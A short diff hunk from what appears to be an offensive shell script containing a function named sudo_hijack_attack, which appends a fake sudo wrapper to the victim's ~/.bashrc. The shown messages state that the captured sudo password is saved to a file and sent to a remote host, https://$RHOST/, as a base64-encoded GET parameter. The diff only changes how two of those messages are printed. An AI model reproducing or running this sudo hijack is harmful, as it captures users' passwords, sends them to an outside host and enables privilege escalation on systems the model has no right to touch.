@@ -114,8 +114,8 @@ sudo_hijack_attack () {
 	$realsudo "${@:1}"
 }' >> ~/.bashrc
 			echo -e "\e[92m[+]\e[0m Hijacked $(whoami)'s sudo access"
-			echo -e "\e[92m[+]\e[0m Password will be Stored in $PASSWDFILE"
-			echo -e "\e[92m[+]\e[0m $PASSWDFILE will be exfiltrated to https://$RHOST/ as a base64 encoded GET parameter"
+			echo "[+] Password will be Stored in $PASSWDFILE"
+			echo "[+] $PASSWDFILE will be exfiltrated to https://$RHOST/ as a base64 encoded GET parameter"
 		else
 			echo -e "\e[92m[+]\e[0m Sudo Hijack Attack Possible"
 		fi
